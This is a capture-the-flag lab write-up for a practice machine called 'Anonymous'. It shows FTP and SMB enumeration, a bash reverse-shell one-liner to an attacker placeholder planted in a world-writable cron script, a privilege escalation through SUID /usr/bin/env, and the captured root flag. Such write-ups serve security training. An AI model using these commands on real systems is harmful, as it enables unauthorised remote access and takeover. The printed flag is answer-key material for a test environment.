# Lab Report: Machine "Anonymous" Compromise

**Target IP:** `10.112.164.64`

---
## 🛠️ Toolset Summary

|**Category**|**Tools Used**|
|---|---|
|**Enumeration**|`nmap`, `nxc` (SMB), `exiftool`, `stegseek`|
|**Access**|`ftp`, `nc` (Netcat)|
|**PrivEsc**|`find` (SUID search), `/usr/bin/env`|

---
## 🔍 Phase 1: Enumeration & Rabbit Holes

Initial scans revealed an SMB share and an FTP server allowing anonymous login.

- **The Corgi Rabbit Hole:** Analyzed `corgo2.jpg` and `puppos.jpeg` using `exiftool` and `stegseek`.
    
    - _Finding:_ While metadata revealed the original filename `IMG_6219.CR2`, steganography was a dead end. This is a common CTF distraction technique.
        
- **Discovery:** Identified the user **`namelessone`** through SMB share remarks.

---
## ⚓ Phase 2: Initial Foothold (RCE)

The breakthrough occurred in the FTP `/scripts` directory.

1. **Vulnerability:** Found `clean.sh`, a world-writable Bash script.
    
2. **Vector:** Determined the script was running as a **Cron Job** (automated task) based on periodic updates to `removed_files.log`.
    
3. **Exploitation:** Created a Bash reverse shell payload:
    
    `bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1`
    
    - Overwrote the existing `clean.sh` via FTP.
        
4. **Result:** Received a reverse shell connection as user `namelessone`.

---
## 🚀 Phase 3: Privilege Escalation

Once inside as a low-privileged user, the goal was to elevate to `root`.

- **SUID Discovery:** Ran a search for binaries with the SetUID bit.
    
    `find / -user root -perm -4000 -print 2>/dev/null`
    
- **The Misconfiguration:** Found **`/usr/bin/env`** with SUID permissions. This is a critical security flaw because `env` can execute any other binary with the owner's privileges.
    
- **The Final Jump:** Executed the following to bypass ID resetting: (<u>GTFOBins</u>)
    
    `$ /usr/bin/env /bin/sh -p`

---
## 🏆 Final Objective

Successfully accessed the root directory and captured the final proof of compromise.

> **Root Flag:** `4d930091c31a622a7ed10f27999af363`

---
### 💡 Key Lessons Learned

- **Don't get stuck on Stego If `rockyou.txt` fails with `stegseek`, look for other services immediately.
    
- **Writable Scripts = Root:** Any script run by a higher-privileged user that can be edited by a lower-privileged user is a guaranteed compromise.
    
- **SUID env is Dangerous:** Standard system utilities should never have the SUID bit unless absolutely necessary and strictly scoped.
